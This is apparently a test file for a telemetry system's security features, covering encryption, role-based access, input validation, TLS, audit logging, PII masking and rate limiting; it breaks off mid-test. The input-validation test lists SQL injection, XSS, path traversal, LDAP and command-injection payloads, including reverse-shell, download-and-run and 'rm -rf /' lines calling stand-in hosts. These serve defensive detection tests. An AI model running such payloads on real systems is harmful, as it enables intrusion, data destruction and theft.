// Azimuth Telemetry System - Security Comprehensive Tests
// This file contains comprehensive tests for security features and vulnerability prevention

// Test 1: Data Encryption and Decryption
test "data encryption and decryption" {
  let encryption_manager = EncryptionManager::new()
  
  // Generate encryption keys
  let key_result = EncryptionManager::generate_key(encryption_manager, "AES256")
  match key_result {
    Some(key) => {
      assert_true(key.length() > 0)
      
      // Test data encryption
      let sensitive_data = "sensitive_telemetry_data_with_pii_and_credentials"
      let encrypted_result = EncryptionManager::encrypt(encryption_manager, key, sensitive_data)
      match encrypted_result {
        Some(encrypted_data) => {
          assert_true(encrypted_data.length() > 0)
          assert_not_eq(encrypted_data, sensitive_data) // Should be different
          
          // Test data decryption
          let decrypted_result = EncryptionManager::decrypt(encryption_manager, key, encrypted_data)
          match decrypted_result {
            Some(decrypted_data) => {
              assert_eq(decrypted_data, sensitive_data) // Should match original
            }
            None => assert_true(false)
          }
          
          // Test encryption with different key
          let different_key_result = EncryptionManager::generate_key(encryption_manager, "AES256")
          match different_key_result {
            Some(different_key) => {
              let decrypted_with_different_key = EncryptionManager::decrypt(
                encryption_manager, 
                different_key, 
                encrypted_data
              )
              match decrypted_with_different_key {
                Some(_) => assert_true(false) // Should not decrypt with different key
                None => assert_true(true) // Expected failure
              }
            }
            None => assert_true(false)
          }
        }
        None => assert_true(false)
      }
    }
    None => assert_true(false)
  }
  
  // Test key derivation
  let password = "secure_password_for_telemetry_system"
  let salt = "random_salt_value_for_key_derivation"
  let derived_key_result = EncryptionManager::derive_key(encryption_manager, password, salt)
  match derived_key_result {
    Some(derived_key) => {
      assert_true(derived_key.length() > 0)
      
      // Test encryption with derived key
      let test_data = "test_data_for_derived_key_encryption"
      let encrypted_result = EncryptionManager::encrypt(encryption_manager, derived_key, test_data)
      match encrypted_result {
        Some(encrypted_data) => {
          // Test decryption with derived key
          let decrypted_result = EncryptionManager::decrypt(encryption_manager, derived_key, encrypted_data)
          match decrypted_result {
            Some(decrypted_data) => {
              assert_eq(decrypted_data, test_data)
            }
            None => assert_true(false)
          }
        }
        None => assert_true(false)
      }
    }
    None => assert_true(false)
  }
  
  // Test key rotation
  let original_key_result = EncryptionManager::generate_key(encryption_manager, "AES256")
  match original_key_result {
    Some(original_key) => {
      let test_data = "test_data_for_key_rotation"
      let encrypted_result = EncryptionManager::encrypt(encryption_manager, original_key, test_data)
      match encrypted_result {
        Some(encrypted_data) => {
          // Generate new key
          let new_key_result = EncryptionManager::generate_key(encryption_manager, "AES256")
          match new_key_result {
            Some(new_key) => {
              // Re-encrypt data with new key
              let reencrypted_result = EncryptionManager::reencrypt(
                encryption_manager, 
                original_key, 
                new_key, 
                encrypted_data
              )
              match reencrypted_result {
                Some(reencrypted_data) => {
                  // Decrypt with new key
                  let decrypted_result = EncryptionManager::decrypt(
                    encryption_manager, 
                    new_key, 
                    reencrypted_data
                  )
                  match decrypted_result {
                    Some(decrypted_data) => {
                      assert_eq(decrypted_data, test_data)
                    }
                    None => assert_true(false)
                  }
                  
                  // Verify old key cannot decrypt new data
                  let old_key_decrypt_result = EncryptionManager::decrypt(
                    encryption_manager, 
                    original_key, 
                    reencrypted_data
                  )
                  match old_key_decrypt_result {
                    Some(_) => assert_true(false) // Should not decrypt with old key
                    None => assert_true(true) // Expected failure
                  }
                }
                None => assert_true(false)
              }
            }
            None => assert_true(false)
          }
        }
        None => assert_true(false)
      }
    }
    None => assert_true(false)
  }
}

// Test 2: Access Control and Authentication
test "access control and authentication" {
  let access_control_manager = AccessControlManager::new()
  
  // Create users with different roles
  let admin_user = User::new("admin", "admin_password")
  let operator_user = User::new("operator", "operator_password")
  let viewer_user = User::new("viewer", "viewer_password")
  
  // Assign roles to users
  AccessControlManager::assign_role(access_control_manager, admin_user, "admin")
  AccessControlManager::assign_role(access_control_manager, operator_user, "operator")
  AccessControlManager::assign_role(access_control_manager, viewer_user, "viewer")
  
  // Test role-based permissions
  let admin_permissions = AccessControlManager::get_permissions(access_control_manager, "admin")
  assert_true(admin_permissions.contains("read"))
  assert_true(admin_permissions.contains("write"))
  assert_true(admin_permissions.contains("delete"))
  assert_true(admin_permissions.contains("configure"))
  assert_true(admin_permissions.contains("manage_users"))
  
  let operator_permissions = AccessControlManager::get_permissions(access_control_manager, "operator")
  assert_true(operator_permissions.contains("read"))
  assert_true(operator_permissions.contains("write"))
  assert_false(operator_permissions.contains("delete"))
  assert_false(operator_permissions.contains("configure"))
  assert_false(operator_permissions.contains("manage_users"))
  
  let viewer_permissions = AccessControlManager::get_permissions(access_control_manager, "viewer")
  assert_true(viewer_permissions.contains("read"))
  assert_false(viewer_permissions.contains("write"))
  assert_false(viewer_permissions.contains("delete"))
  assert_false(viewer_permissions.contains("configure"))
  assert_false(viewer_permissions.contains("manage_users"))
  
  // Test authentication
  let admin_auth_result = AccessControlManager::authenticate(
    access_control_manager, 
    "admin", 
    "admin_password"
  )
  match admin_auth_result {
    Some(authenticated_user) => {
      assert_eq(authenticated_user.username, "admin")
      assert_eq(authenticated_user.role, "admin")
    }
    None => assert_true(false)
  }
  
  // Test authentication failure with wrong password
  let wrong_password_auth_result = AccessControlManager::authenticate(
    access_control_manager, 
    "admin", 
    "wrong_password"
  )
  match wrong_password_auth_result {
    Some(_) => assert_true(false) // Should not authenticate with wrong password
    None => assert_true(true) // Expected failure
  }
  
  // Test authentication failure with non-existent user
  let non_existent_user_auth_result = AccessControlManager::authenticate(
    access_control_manager, 
    "non_existent_user", 
    "password"
  )
  match non_existent_user_auth_result {
    Some(_) => assert_true(false) // Should not authenticate non-existent user
    None => assert_true(true) // Expected failure
  }
  
  // Test authorization
  let admin_auth = AccessControlManager::authenticate(
    access_control_manager, 
    "admin", 
    "admin_password"
  ).unwrap()
  
  // Test admin can perform all operations
  assert_true(AccessControlManager::can_perform_operation(
    access_control_manager, 
    admin_auth, 
    "read_telemetry"
  ))
  assert_true(AccessControlManager::can_perform_operation(
    access_control_manager, 
    admin_auth, 
    "write_telemetry"
  ))
  assert_true(AccessControlManager::can_perform_operation(
    access_control_manager, 
    admin_auth, 
    "delete_telemetry"
  ))
  assert_true(AccessControlManager::can_perform_operation(
    access_control_manager, 
    admin_auth, 
    "configure_system"
  ))
  
  // Test operator can perform limited operations
  let operator_auth = AccessControlManager::authenticate(
    access_control_manager, 
    "operator", 
    "operator_password"
  ).unwrap()
  
  assert_true(AccessControlManager::can_perform_operation(
    access_control_manager, 
    operator_auth, 
    "read_telemetry"
  ))
  assert_true(AccessControlManager::can_perform_operation(
    access_control_manager, 
    operator_auth, 
    "write_telemetry"
  ))
  assert_false(AccessControlManager::can_perform_operation(
    access_control_manager, 
    operator_auth, 
    "delete_telemetry"
  ))
  assert_false(AccessControlManager::can_perform_operation(
    access_control_manager, 
    operator_auth, 
    "configure_system"
  ))
  
  // Test viewer can only read
  let viewer_auth = AccessControlManager::authenticate(
    access_control_manager, 
    "viewer", 
    "viewer_password"
  ).unwrap()
  
  assert_true(AccessControlManager::can_perform_operation(
    access_control_manager, 
    viewer_auth, 
    "read_telemetry"
  ))
  assert_false(AccessControlManager::can_perform_operation(
    access_control_manager, 
    viewer_auth, 
    "write_telemetry"
  ))
  assert_false(AccessControlManager::can_perform_operation(
    access_control_manager, 
    viewer_auth, 
    "delete_telemetry"
  ))
  assert_false(AccessControlManager::can_perform_operation(
    access_control_manager, 
    viewer_auth, 
    "configure_system"
  ))
}

// Test 3: Input Validation and Sanitization
test "input validation and sanitization" {
  let input_validator = InputValidator::new()
  
  // Test SQL injection prevention
  let malicious_sql_inputs = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "1'; UPDATE users SET password='hacked'; --",
    "'; DELETE FROM telemetry_data; --",
    "1' UNION SELECT username, password FROM users --"
  ]
  
  for malicious_input in malicious_sql_inputs {
    let is_safe = InputValidator::is_safe_sql(input_validator, malicious_input)
    assert_false(is_safe) // Should be detected as unsafe
    
    let sanitized_input = InputValidator::sanitize_sql(input_validator, malicious_input)
    assert_not_eq(sanitized_input, malicious_input) // Should be different
    assert_true(InputValidator::is_safe_sql(input_validator, sanitized_input)) // Should be safe now
  }
  
  // Test XSS prevention
  let malicious_xss_inputs = [
    "<script>alert('XSS')</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<svg onload=\"alert('XSS')\">",
    "javascript:alert('XSS')",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<body onload=\"alert('XSS')\">",
    "<input onfocus=\"alert('XSS')\" autofocus>",
    "<select onfocus=\"alert('XSS')\" autofocus>",
    "<textarea onfocus=\"alert('XSS')\" autofocus>",
    "<keygen onfocus=\"alert('XSS')\" autofocus>",
    "<video><source onerror=\"alert('XSS')\">",
    "<audio src=\"x\" onerror=\"alert('XSS')\">"
  ]
  
  for malicious_input in malicious_xss_inputs {
    let is_safe = InputValidator::is_safe_html(input_validator, malicious_input)
    assert_false(is_safe) // Should be detected as unsafe
    
    let sanitized_input = InputValidator::sanitize_html(input_validator, malicious_input)
    assert_not_eq(sanitized_input, malicious_input) // Should be different
    assert_true(InputValidator::is_safe_html(input_validator, sanitized_input)) // Should be safe now
  }
  
  // Test path traversal prevention
  let malicious_path_inputs = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    "/etc/passwd",
    "\\windows\\system32\\config\\sam",
    "file:///etc/passwd",
    "file:///c:/windows/system32/config/sam"
  ]
  
  for malicious_input in malicious_path_inputs {
    let is_safe = InputValidator::is_safe_path(input_validator, malicious_input)
    assert_false(is_safe) // Should be detected as unsafe
    
    let sanitized_input = InputValidator::sanitize_path(input_validator, malicious_input)
    assert_not_eq(sanitized_input, malicious_input) // Should be different
    assert_true(InputValidator::is_safe_path(input_validator, sanitized_input)) // Should be safe now
  }
  
  // Test command injection prevention
  let malicious_command_inputs = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "& echo 'hacked' > /tmp/hacked.txt",
    "`whoami`",
    "$(whoami)",
    "; curl http://evil.com/steal_data.sh | sh",
    "| nc attacker.com 4444 -e /bin/sh",
    "& wget http://evil.com/malware -O /tmp/malware; chmod +x /tmp/malware; /tmp/malware"
  ]
  
  for malicious_input in malicious_command_inputs {
    let is_safe = InputValidator::is_safe_command(input_validator, malicious_input)
    assert_false(is_safe) // Should be detected as unsafe
    
    let sanitized_input = InputValidator::sanitize_command(input_validator, malicious_input)
    assert_not_eq(sanitized_input, malicious_input) // Should be different
    assert_true(InputValidator::is_safe_command(input_validator, sanitized_input)) // Should be safe now
  }
  
  // Test LDAP injection prevention
  let malicious_ldap_inputs = [
    "*)(&",
    "*)(|(objectClass=*)",
    "*)(|(password=*))",
    "*))(|(cn=*",
    "*)%00",
    "admin)(&(password=*))",
    "*)(uid=*",
    "*)(|(objectClass=user)(cn=*",
    "*)(|(objectClass=person)(cn=*"
  ]
  
  for malicious_input in malicious_ldap_inputs {
    let is_safe = InputValidator::is_safe_ldap(input_validator, malicious_input)
    assert_false(is_safe) // Should be detected as unsafe
    
    let sanitized_input = InputValidator::sanitize_ldap(input_validator, malicious_input)
    assert_not_eq(sanitized_input, malicious_input) // Should be different
    assert_true(InputValidator::is_safe_ldap(input_validator, sanitized_input)) // Should be safe now
  }
}

// Test 4: Secure Communication
test "secure communication" {
  let secure_communication_manager = SecureCommunicationManager::new()
  
  // Generate SSL/TLS certificates
  let certificate_result = SecureCommunicationManager::generate_certificate(
    secure_communication_manager, 
    "azimuth.telemetry.local", 
    365 // days
  )
  match certificate_result {
    Some(certificate) => {
      assert_true(certificate.public_key.length() > 0)
      assert_true(certificate.private_key.length() > 0)
      assert_true(certificate.certificate_data.length() > 0)
      
      // Test certificate validation
      let is_valid = SecureCommunicationManager::validate_certificate(
        secure_communication_manager, 
        certificate
      )
      assert_true(is_valid)
      
      // Test secure server creation
      let server_result = SecureCommunicationManager::create_secure_server(
        secure_communication_manager, 
        "127.0.0.1", 
        8443, 
        certificate
      )
      match server_result {
        Some(server) => {
          // Test secure client creation
          let client_result = SecureCommunicationManager::create_secure_client(
            secure_communication_manager, 
            "127.0.0.1", 
            8443
          )
          match client_result {
            Some(client) => {
              // Test secure communication
              let test_message = "secure telemetry data"
              let send_result = SecureCommunicationManager::send_secure_message(
                secure_communication_manager, 
                client, 
                test_message
              )
              assert_true(send_result)
              
              // Test message reception
              let receive_result = SecureCommunicationManager::receive_secure_message(
                secure_communication_manager, 
                server
              )
              match receive_result {
                Some(received_message) => {
                  assert_eq(received_message, test_message)
                }
                None => assert_true(false)
              }
              
              // Test mutual authentication
              let client_certificate_result = SecureCommunicationManager::generate_certificate(
                secure_communication_manager, 
                "client.azimuth.telemetry.local", 
                365
              )
              match client_certificate_result {
                Some(client_certificate) => {
                  // Configure server for mutual authentication
                  SecureCommunicationManager::require_client_certificate(
                    secure_communication_manager, 
                    server, 
                    true
                  )
                  
                  // Configure client with certificate
                  SecureCommunicationManager::set_client_certificate(
                    secure_communication_manager, 
                    client, 
                    client_certificate
                  )
                  
                  // Test mutual authentication
                  let mutual_auth_result = SecureCommunicationManager::test_mutual_authentication(
                    secure_communication_manager, 
                    server, 
                    client
                  )
                  assert_true(mutual_auth_result)
                }
                None => assert_true(false)
              }
            }
            None => assert_true(false)
          }
        }
        None => assert_true(false)
      }
    }
    None => assert_true(false)
  }
  
  // Test certificate pinning
  let server_certificate = SecureCommunicationManager::generate_certificate(
    secure_communication_manager, 
    "pinned.azimuth.telemetry.local", 
    365
  ).unwrap()
  
  // Pin certificate
  SecureCommunicationManager::pin_certificate(
    secure_communication_manager, 
    "pinned.azimuth.telemetry.local", 
    server_certificate
  )
  
  // Test connection with pinned certificate
  let pinned_server = SecureCommunicationManager::create_secure_server(
    secure_communication_manager, 
    "127.0.0.1", 
    8444, 
    server_certificate
  ).unwrap()
  
  let pinned_client = SecureCommunicationManager::create_secure_client(
    secure_communication_manager, 
    "127.0.0.1", 
    8444
  ).unwrap()
  
  // Verify certificate pinning
  let is_pinned = SecureCommunicationManager::is_certificate_pinned(
    secure_communication_manager, 
    "pinned.azimuth.telemetry.local"
  )
  assert_true(is_pinned)
  
  // Test connection with pinned certificate
  let pinned_connection_result = SecureCommunicationManager::test_pinned_connection(
    secure_communication_manager, 
    pinned_server, 
    pinned_client
  )
  assert_true(pinned_connection_result)
  
  // Test connection with wrong certificate (should fail)
  let wrong_certificate = SecureCommunicationManager::generate_certificate(
    secure_communication_manager, 
    "wrong.azimuth.telemetry.local", 
    365
  ).unwrap()
  
  let wrong_server = SecureCommunicationManager::create_secure_server(
    secure_communication_manager, 
    "127.0.0.1", 
    8445, 
    wrong_certificate
  ).unwrap()
  
  let wrong_client = SecureCommunicationManager::create_secure_client(
    secure_communication_manager, 
    "127.0.0.1", 
    8445
  ).unwrap()
  
  // Verify connection fails with wrong certificate
  let wrong_connection_result = SecureCommunicationManager::test_pinned_connection(
    secure_communication_manager, 
    wrong_server, 
    wrong_client
  )
  assert_false(wrong_connection_result)
}

// Test 5: Audit Logging
test "audit logging" {
  let audit_logger = AuditLogger::new()
  
  // Test audit log creation
  let audit_log = AuditLog::new(
    "user_login",
    "admin",
    "success",
    "User admin logged in successfully",
    [("ip_address", "192.168.1.100"), ("user_agent", "AzimuthClient/1.0")]
  )
  
  // Test audit log recording
  let record_result = AuditLogger::log_event(audit_logger, audit_log)
  assert_true(record_result)
  
  // Test audit log retrieval
  let retrieved_logs = AuditLogger::get_logs(audit_logger, Some("admin"), None, 10)
  assert_true(retrieved_logs.length() > 0)
  
  let latest_log = retrieved_logs[0]
  assert_eq(latest_log.event_type, "user_login")
  assert_eq(latest_log.username, "admin")
  assert_eq(latest_log.result, "success")
  assert_eq(latest_log.description, "User admin logged in successfully")
  
  // Test audit log filtering
  let filtered_logs = AuditLogger::get_logs_by_event_type(
    audit_logger, 
    "user_login", 
    10
  )
  assert_true(filtered_logs.length() > 0)
  
  for log in filtered_logs {
    assert_eq(log.event_type, "user_login")
  }
  
  // Test audit log search
  let search_logs = AuditLogger::search_logs(
    audit_logger, 
    "logged in", 
    10
  )
  assert_true(search_logs.length() > 0)
  
  for log in search_logs {
    assert_true(log.description.contains("logged in"))
  }
  
  // Test security event logging
  let security_log = AuditLog::new(
    "security_violation",
    "unknown_user",
    "failure",
    "Failed login attempt for unknown user",
    [("ip_address", "192.168.1.200"), ("attempted_username", "admin")]
  )
  
  let security_record_result = AuditLogger::log_security_event(audit_logger, security_log)
  assert_true(security_record_result)
  
  // Test critical security event logging
  let critical_security_log = AuditLog::new(
    "critical_security_violation",
    "attacker",
    "failure",
    "Multiple failed login attempts detected",
    [
      ("ip_address", "192.168.1.201"), 
      ("attempts", "5"),
      ("timeframe", "1 minute"),
      ("severity", "critical")
    ]
  )
  
  let critical_security_record_result = AuditLogger::log_critical_security_event(
    audit_logger, 
    critical_security_log
  )
  assert_true(critical_security_record_result)
  
  // Test audit log integrity verification
  let integrity_result = AuditLogger::verify_log_integrity(audit_logger)
  assert_true(integrity_result)
  
  // Test audit log export
  let export_result = AuditLogger::export_logs(audit_logger, "json")
  match export_result {
    Some(exported_data) => {
      assert_true(exported_data.length() > 0)
      
      // Test audit log import
      let import_result = AuditLogger::import_logs(audit_logger, exported_data, "json")
      assert_true(import_result)
    }
    None => assert_true(false)
  }
  
  // Test audit log retention
  let retention_result = AuditLogger::apply_retention_policy(audit_logger, 30) // 30 days
  assert_true(retention_result)
  
  // Test audit log statistics
  let stats = AuditLogger::get_statistics(audit_logger)
  assert_true(stats.total_logs > 0)
  assert_true(stats.security_events > 0)
  assert_true(stats.critical_security_events > 0)
  assert_true(stats.failed_events >= 0)
}

// Test 6: Data Masking and Anonymization
test "data masking and anonymization" {
  let data_masking_manager = DataMaskingManager::new()
  
  // Test PII detection
  let test_data = [
    "User john.doe@example.com logged in from 192.168.1.100",
    "Credit card number: 4532-1234-5678-9012",
    "Social security number: 123-45-6789",
    "Phone number: (555) 123-4567",
    "Address: 123 Main St, Anytown, USA 12345",
    "Patient ID: PAT-2023-00123",
    "Driver license: D1234567",
    "Passport number: AB1234567"
  ]
  
  for data in test_data {
    let pii_fields = DataMaskingManager::detect_pii(data_masking_manager, data)
    assert_true(pii_fields.length() > 0)
    
    for pii_field in pii_fields {
      assert_true(pii_field.type.length() > 0)
      assert_true(pii_field.value.length() > 0)
      assert_true(pii_field.start_index >= 0)
      assert_true(pii_field.end_index > pii_field.start_index)
    }
  }
  
  // Test data masking
  let sensitive_data = "User john.doe@example.com with SSN 123-45-6789 and credit card 4532-1234-5678-9012"
  
  let masked_data = DataMaskingManager::mask_data(
    data_masking_manager, 
    sensitive_data, 
    ["email", "ssn", "credit_card"]
  )
  
  assert_not_eq(masked_data, sensitive_data)
  assert_false(masked_data.contains("john.doe@example.com"))
  assert_false(masked_data.contains("123-45-6789"))
  assert_false(masked_data.contains("4532-1234-5678-9012"))
  assert_true(masked_data.contains("***")) // Should contain masking characters
  
  // Test data anonymization
  let telemetry_data = TelemetryData::new(
    "user.service",
    "user.operation",
    200,
    100,
    true
  )
  
  // Add PII attributes
  let telemetry_with_pii = TelemetryData::with_attributes(
    telemetry_data.service_name,
    telemetry_data.operation_name,
    telemetry_data.status_code,
    telemetry_data.duration_ms,
    telemetry_data.success,
    [
      ("user.email", "john.doe@example.com"),
      ("user.ip", "192.168.1.100"),
      ("user.id", "user-12345"),
      ("session.id", "session-abcdef123456")
    ]
  )
  
  let anonymized_data = DataMaskingManager::anonymize_telemetry_data(
    data_masking_manager, 
    telemetry_with_pii
  )
  
  // Verify PII is anonymized
  assert_not_eq(anonymized_data.attributes.length(), 0)
  
  for (key, value) in anonymized_data.attributes {
    match value {
      StringValue(str_val) => {
        if key.contains("email") {
          assert_false(str_val.contains("john.doe"))
          assert_false(str_val.contains("example.com"))
        }
        if key.contains("ip") {
          assert_false(str_val.contains("192.168.1.100"))
        }
        if key.contains("user.id") {
          assert_false(str_val.contains("user-12345"))
        }
        if key.contains("session.id") {
          assert_false(str_val.contains("session-abcdef123456"))
        }
      }
      _ => assert_true(false)
    }
  }
  
  // Test reversible masking
  let reversible_masked_data = DataMaskingManager::mask_data_reversible(
    data_masking_manager, 
    sensitive_data, 
    ["email", "ssn", "credit_card"]
  )
  
  let unmasked_data = DataMaskingManager::unmask_data(
    data_masking_manager, 
    reversible_masked_data
  )
  
  assert_eq(unmasked_data, sensitive_data)
  
  // Test hashing-based anonymization
  let hash_anonymized_data = DataMaskingManager::anonymize_with_hash(
    data_masking_manager, 
    telemetry_with_pii, 
    "salt_value_for_hashing"
  )
  
  // Verify hash consistency
  let hash_anonymized_data_2 = DataMaskingManager::anonymize_with_hash(
    data_masking_manager, 
    telemetry_with_pii, 
    "salt_value_for_hashing"
  )
  
  assert_eq(hash_anonymized_data.attributes, hash_anonymized_data_2.attributes)
  
  // Verify hash changes with different salt
  let hash_anonymized_data_3 = DataMaskingManager::anonymize_with_hash(
    data_masking_manager, 
    telemetry_with_pii, 
    "different_salt_value"
  )
  
  assert_not_eq(hash_anonymized_data.attributes, hash_anonymized_data_3.attributes)
}

// Test 7: Rate Limiting and DDoS Protection
test "rate limiting and ddos protection" {
  let rate_limiter = RateLimiter::new()
  
  // Test rate limiting configuration
  RateLimiter::configure(rate_limiter, "api_requests", 100, 60) // 100 requests per minute
  RateLimiter::configure(rate_limiter, "login_attempts", 5, 300) // 5 requests per 5 minutes
  RateLimiter::configure(rate_limiter, "data_export", 10, 3600) // 10 requests per hour
  
  // Test rate limiting for API requests
  let client_ip = "192.168.1.100"
  
  // Make requests within limit
  for i in 0..=99 {
    let is_allowed = RateLimiter::is_allowed(rate_limiter, "api_requests", client_ip)
    assert_true(is_allowed) // Should be allowed
  }
  
  // Next request should be rate limited
  let is_rate_limited = RateLimiter::is_allowed(rate_limiter, "api_requests", client_ip)
  assert_false(is_rate_limited) // Should be rate limited
  
  // Test rate limiting for login attempts
  let attacker_ip = "192.168.1.200"
  
  // Make login attempts within limit
  for i in 0..=4 {
    let is_allowed = RateLimiter::is_allowed(rate_limiter, "login_attempts", attacker_ip)
    assert_true(is_allowed) // Should be allowed
  }
  
  // Next login attempt should be rate limited
  let is_login_rate_limited = RateLimiter::is_allowed(rate_limiter, "login_attempts", attacker_ip)
  assert_false(is_login_rate_limited) // Should be rate limited
  
  // Test rate limiting for data export
  let user_id = "user-12345"
  
  // Make data export requests within limit
  for i in 0..=9 {
    let is_allowed = RateLimiter::is_allowed(rate_limiter, "data_export", user_id)
    assert_true(is_allowed) // Should be allowed
  }
  
  // Next data export request should be rate limited
  let is_export_rate_limited = RateLimiter::is_allowed(rate_limiter, "data_export", user_id)
  assert_false(is_export_rate_limited) // Should be rate limited
  
  // Test rate limit reset
  RateLimiter::reset(rate_limiter, "api_requests", client_ip)
  
  let is_allowed_after_reset = RateLimiter::is_allowed(rate_limiter, "api_requests", client_ip)
  assert_true(is_allowed_after_reset) // Should be allowed after reset
  
  // Test rate limit statistics
  let stats = RateLimiter::get_statistics(rate_limiter)
  assert_true(stats.total_requests > 0)
  assert_true(stats.blocked_requests > 0)
  assert_true(stats.active_clients > 0)
  
  // Test DDoS detection
  let ddos_detector = DDoSDetector::new()
  
  // Configure DDoS detection
  DDoSDetector::configure(ddos_detector, "request_threshold", 1000) // 1000 requests per minute
  DDoSDetector::configure(ddos_detector, "ip_threshold", 100) // 100 requests per minute per IP
  DDoSDetector::configure(ddos_detector, "block_duration", 300) // 5 minutes block duration
  
  // Simulate DDoS attack
  let attacker_ips = []
  for i in 0..=50 {
    attacker_ips = attacker_ips.push("192.168.2." + (i + 1).to_string())
  }
  
  // Simulate attack traffic
  for ip in attacker_ips {
    for j in 0..=20 {
      DDoSDetector::record_request(ddos_detector, ip)
    }
  }
  
  // Detect DDoS attack
  let is_ddos_attack = DDoSDetector::is_attack_detected(ddos_detector)
  assert_true(is_ddos_attack)
  
  // Get blocked IPs
  let blocked_ips = DDoSDetector::get_blocked_ips(ddos_detector)
  assert_true(blocked_ips.length() > 0)
  
  // Test IP blocking
  for ip in blocked_ips {
    let is_blocked = DDoSDetector::is_ip_blocked(ddos_detector, ip)
    assert_true(is_blocked)
  }
  
  // Test IP unblocking
  if blocked_ips.length() > 0 {
    let ip_to_unblock = blocked_ips[0]
    DDoSDetector::unblock_ip(ddos_detector, ip_to_unblock)
    
    let is_still_blocked = DDoSDetector::is_ip_blocked(ddos_detector, ip_to_unblock)
    assert_false(is_still_blocked)
  }
}

// Test 8: Security Monitoring and Alerting
test "security monitoring and alerting" {
  let security_monitor = SecurityMonitor::new()
  
  // Configure security monitoring
  SecurityMonitor::configure(security_monitor, "failed_login_threshold", 5)
  SecurityMonitor::configure(security_monitor, "suspicious_activity_threshold", 10)
  SecurityMonitor::configure(security_monitor, "alert_cooldown", 300) // 5 minutes
  
  // Test failed login monitoring
  let suspicious_ip = "192.168.1.100"
  
  // Record failed login attempts
  for i in 0..=5 {
    SecurityMonitor::record_failed_login(security_monitor, suspicious_ip, "admin")
  }
  
  // Check if security alert is triggered
  let alerts = SecurityMonitor::get_active_alerts(security_monitor)
  assert_true(alerts.length() > 0)
  
  let failed_login_alert = alerts[0]
  assert_eq(failed_login_alert.type, "failed_login_threshold")
  assert_eq(failed_login_alert.source_ip, suspicious_ip)
  assert_eq(failed_login_alert.target, "admin")
  assert_true(failed_login_alert.severity >= 5) // Should be high severity
  
  // Test suspicious activity monitoring
  let suspicious_user = "user-12345"
  
  // Record suspicious activities
  for i in 0..=10 {
    SecurityMonitor::record_suspicious_activity(
      security_monitor, 
      suspicious_user, 
      "unusual_data_access_pattern"
    )
  }
  
  // Check if security alert is triggered
  let updated_alerts = SecurityMonitor::get_active_alerts(security_monitor)
  assert_true(updated_alerts.length() > alerts.length)
  
  let suspicious_activity_alert = updated_alerts[updated_alerts.length() - 1]
  assert_eq(suspicious_activity_alert.type, "suspicious_activity_threshold")
  assert_eq(suspicious_activity_alert.source_user, suspicious_user)
  assert_eq(suspicious_activity_alert.description, "unusual_data_access_pattern")
  assert_true(suspicious_activity_alert.severity >= 4) // Should be medium-high severity
  
  // Test anomaly detection
  let anomaly_detector = AnomalyDetector::new()
  
  // Configure anomaly detection
  AnomalyDetector::configure(anomaly_detector, "baseline_period_days", 7)
  AnomalyDetector::configure(anomaly_detector, "anomaly_threshold", 2.0) // 2 standard deviations
  
  // Record normal activity patterns
  for day in 0..=6 {
    for hour in 0..=23 {
      let request_count = 100 + (hour % 10) * 10 // Normal pattern
      AnomalyDetector::record_activity(anomaly_detector, day, hour, request_count)
    }
  }
  
  // Build baseline
  AnomalyDetector::build_baseline(anomaly_detector)
  
  // Record anomalous activity
  AnomalyDetector::record_activity(anomaly_detector, 7, 12, 1000) // Unusual spike
  
  // Detect anomalies
  let anomalies = AnomalyDetector::detect_anomalies(anomaly_detector)
  assert_true(anomalies.length() > 0)
  
  let anomaly = anomalies[0]
  assert_eq(anomaly.day, 7)
  assert_eq(anomaly.hour, 12)
  assert_eq(anomaly.actual_value, 1000)
  assert_true(anomaly.expected_value < 500) // Should be much lower
  assert_true(anomaly.anomaly_score > 2.0) // Should exceed threshold
  
  // Test security alert notification
  let alert_notifier = AlertNotifier::new()
  
  // Configure alert notification
  AlertNotifier::configure(alert_notifier, "email_enabled", true)
  AlertNotifier::configure(alert_notifier, "sms_enabled", false)
  AlertNotifier::configure(alert_notifier, "webhook_enabled", true)
  AlertNotifier::configure(alert_notifier, "webhook_url", "https://example.com/security-alerts")
  
  // Test alert notification
  let notification_result = AlertNotifier::send_alert(alert_notifier, failed_login_alert)
  assert_true(notification_result)
  
  // Test alert escalation
  let escalated_alert = SecurityMonitor::escalate_alert(security_monitor, failed_login_alert.id)
  match escalated_alert {
    Some(alert) => {
      assert_true(alert.severity > failed_login_alert.severity)
      assert_true(alert.escalated)
    }
    None => assert_true(false)
  }
  
  // Test alert resolution
  let resolution_result = SecurityMonitor::resolve_alert(security_monitor, failed_login_alert.id, "Investigated and resolved")
  assert_true(resolution_result)
  
  // Verify alert is resolved
  let resolved_alert = SecurityMonitor::get_alert(security_monitor, failed_login_alert.id)
  match resolved_alert {
    Some(alert) => {
      assert_true(alert.resolved)
      assert_eq(alert.resolution, "Investigated and resolved")
    }
    None => assert_true(false)
  }
  
  // Test security metrics
  let security_metrics = SecurityMonitor::get_metrics(security_monitor)
  assert_true(security_metrics.total_alerts > 0)
  assert_true(security_metrics.active_alerts >= 0)
  assert_true(security_metrics.resolved_alerts > 0)
  assert_true(security_metrics.escalated_alerts >= 0)
  assert_true(security_metrics.failed_login_attempts > 0)
  assert_true(security_metrics.suspicious_activities > 0)
}

// Test 9: Vulnerability Scanning
test "vulnerability scanning" {
  let vulnerability_scanner = VulnerabilityScanner::new()
  
  // Configure vulnerability scanner
  VulnerabilityScanner::configure(vulnerability_scanner, "scan_depth", "thorough")
  VulnerabilityScanner::configure(vulnerability_scanner, "check_dependencies", true)
  VulnerabilityScanner::configure(vulnerability_scanner, "check_configuration", true)
  
  // Test dependency vulnerability scanning
  let dependencies = [
    Dependency::new("openssl", "1.1.1"),
    Dependency::new("libcurl", "7.68.0"),
    Dependency::new("sqlite", "3.31.1"),
    Dependency::new("jwt", "0.9.1"),
    Dependency::new("bcrypt", "3.0.6")
  ]
  
  let dependency_vulnerabilities = VulnerabilityScanner::scan_dependencies(
    vulnerability_scanner, 
    dependencies
  )
  
  // Verify vulnerabilities are detected
  assert_true(dependency_vulnerabilities.length() >= 0)
  
  for vulnerability in dependency_vulnerabilities {
    assert_true(vulnerability.dependency.length() > 0)
    assert_true(vulnerability.version.length() > 0)
